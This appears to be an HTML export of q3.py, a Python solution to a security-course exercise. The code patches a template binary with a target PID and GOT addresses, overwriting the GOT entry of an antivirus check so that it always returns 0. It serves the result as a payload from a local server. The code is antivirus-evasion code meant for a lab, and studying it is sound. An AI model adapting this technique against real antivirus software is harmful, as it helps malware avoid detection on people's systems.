@@ -1,0 +1,73 @@
+<html>
+<head>
+<title>q3.py</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<style type="text/css">
+.ln { color: #606366; font-weight: normal; font-style: normal; }
+.s0 { color: rgb(204,120,50); font-weight: bold; }
+.s1 { color: rgb(169,183,198); }
+.s2 { color: rgb(204,120,50); }
+.s3 { color: rgb(165,194,97); }
+.s4 { color: rgb(104,151,187); }
+.s5 { color: rgb(128,128,128); }
+</style>
+</head>
+<BODY BGCOLOR="#2b2b2b">
+<TABLE CELLSPACING=0 CELLPADDING=5 COLS=1 WIDTH="100%" BGCOLOR="#606060" >
+<TR><TD><CENTER>
+<FONT FACE="Arial, Helvetica" COLOR="#000000">
+q3.py</FONT>
+</center></TD></TR></TABLE>
+<pre>
+<a name="l1"><span class="ln">1    </span></a><span class="s0">import </span><span class="s1">server 
+<a name="l2"><span class="ln">2    </span></a></span><span class="s0">import </span><span class="s1">struct 
+<a name="l3"><span class="ln">3    </span></a></span><span class="s0">from </span><span class="s1">addresses </span><span class="s0">import </span><span class="s1">CHECK_IF_VIRUS_GOT</span><span class="s2">, </span><span class="s1">CHECK_IF_VIRUS_ALTERNATIVE</span><span class="s2">, </span><span class="s1">address_to_bytes 
+<a name="l4"><span class="ln">4    </span></a> 
+<a name="l5"><span class="ln">5    </span></a>TEMPLATE_PATH = </span><span class="s3">&quot;./q3.template&quot;</span><span class="s1"> 
+<a name="l6"><span class="ln">6    </span></a>ANTI_PID_HOLDER = </span><span class="s4">0x12345678</span><span class="s1"> 
+<a name="l7"><span class="ln">7    </span></a>CHECK_VIRUS_GOT_HOLDER = </span><span class="s4">0x87654321</span><span class="s1"> 
+<a name="l8"><span class="ln">8    </span></a>REPLACE_VIRUS_HOLDER = </span><span class="s4">0x71727374</span><span class="s1"> 
+<a name="l9"><span class="ln">9    </span></a> 
+<a name="l10"><span class="ln">10   </span></a></span><span class="s0">class </span><span class="s1">SolutionServer(server.EvadeAntivirusServer): 
+<a name="l11"><span class="ln">11   </span></a> 
+<a name="l12"><span class="ln">12   </span></a>    </span><span class="s0">def </span><span class="s1">get_payload(self</span><span class="s2">, </span><span class="s1">pid): 
+<a name="l13"><span class="ln">13   </span></a>        </span><span class="s5"># Return a payload that will replace the GOT entry for check_if_virus</span><span class="s1"> 
+<a name="l14"><span class="ln">14   </span></a>        </span><span class="s5"># with another function of a similar signature, that will return 0.</span><span class="s1"> 
+<a name="l15"><span class="ln">15   </span></a>        </span><span class="s5"># 1. You can assume we already compiled q3.c into q3.template.</span><span class="s1"> 
+<a name="l16"><span class="ln">16   </span></a>        </span><span class="s5"># 2. Use CHECK_IF_VIRUS_GOT and CHECK_IF_VIRUS_ALTERNATIVE.</span><span class="s1"> 
+<a name="l17"><span class="ln">17   </span></a>        </span><span class="s0">with </span><span class="s1">open(TEMPLATE_PATH</span><span class="s2">, </span><span class="s3">'rb'</span><span class="s1">) </span><span class="s0">as </span><span class="s1">reader: 
+<a name="l18"><span class="ln">18   </span></a>            payload_template = reader.read() 
+<a name="l19"><span class="ln">19   </span></a> 
+<a name="l20"><span class="ln">20   </span></a>        </span><span class="s5"># convert the address to bytes before lookup</span><span class="s1"> 
+<a name="l21"><span class="ln">21   </span></a>        anti_pid_holder_bytes = address_to_bytes(ANTI_PID_HOLDER) 
+<a name="l22"><span class="ln">22   </span></a>        check_virus_holder_bytes = address_to_bytes(CHECK_VIRUS_GOT_HOLDER) 
+<a name="l23"><span class="ln">23   </span></a>        replace_virus_holder_bytes = address_to_bytes(REPLACE_VIRUS_HOLDER) 
+<a name="l24"><span class="ln">24   </span></a> 
+<a name="l25"><span class="ln">25   </span></a>        </span><span class="s5"># find and replace with the real value in the .text segment of the template binary</span><span class="s1"> 
+<a name="l26"><span class="ln">26   </span></a>        pid_addr = payload_template.find(anti_pid_holder_bytes) 
+<a name="l27"><span class="ln">27   </span></a>        check_virus_addr = payload_template.find(check_virus_holder_bytes) 
+<a name="l28"><span class="ln">28   </span></a>        replace_virus_addr = payload_template.find(replace_virus_holder_bytes) 
+<a name="l29"><span class="ln">29   </span></a> 
+<a name="l30"><span class="ln">30   </span></a>        payload = payload_template 
+<a name="l31"><span class="ln">31   </span></a>        payload = payload[:pid_addr] + address_to_bytes(pid) + payload[pid_addr+</span><span class="s4">4</span><span class="s1">:] 
+<a name="l32"><span class="ln">32   </span></a>        payload = payload[:check_virus_addr] + address_to_bytes(CHECK_IF_VIRUS_GOT) + payload[check_virus_addr+</span><span class="s4">4</span><span class="s1">:] 
+<a name="l33"><span class="ln">33   </span></a>        payload = payload[:replace_virus_addr] + address_to_bytes(CHECK_IF_VIRUS_ALTERNATIVE) + payload[replace_virus_addr+</span><span class="s4">4</span><span class="s1">:] 
+<a name="l34"><span class="ln">34   </span></a> 
+<a name="l35"><span class="ln">35   </span></a>        </span><span class="s0">return </span><span class="s1">payload 
+<a name="l36"><span class="ln">36   </span></a>         
+<a name="l37"><span class="ln">37   </span></a> 
+<a name="l38"><span class="ln">38   </span></a>    </span><span class="s0">def </span><span class="s1">print_handler(self</span><span class="s2">, </span><span class="s1">payload</span><span class="s2">, </span><span class="s1">product): 
+<a name="l39"><span class="ln">39   </span></a>        </span><span class="s0">print</span><span class="s1">(product) 
+<a name="l40"><span class="ln">40   </span></a> 
+<a name="l41"><span class="ln">41   </span></a>    </span><span class="s0">def </span><span class="s1">evade_antivirus(self</span><span class="s2">, </span><span class="s1">pid): 
+<a name="l42"><span class="ln">42   </span></a>        self.add_payload( 
+<a name="l43"><span class="ln">43   </span></a>            self.get_payload(pid)</span><span class="s2">,</span><span class="s1"> 
+<a name="l44"><span class="ln">44   </span></a>            self.print_handler) 
+<a name="l45"><span class="ln">45   </span></a> 
+<a name="l46"><span class="ln">46   </span></a> 
+<a name="l47"><span class="ln">47   </span></a></span><span class="s0">if </span><span class="s1">__name__ == </span><span class="s3">'__main__'</span><span class="s1">: 
+<a name="l48"><span class="ln">48   </span></a>    SolutionServer().run_server(host=</span><span class="s3">'0.0.0.0'</span><span class="s2">, </span><span class="s1">port=</span><span class="s4">8000</span><span class="s1">) 
+<a name="l49"><span class="ln">49   </span></a> 
+<a name="l50"><span class="ln">50   </span></a></span></pre>
+</body>
+</html>
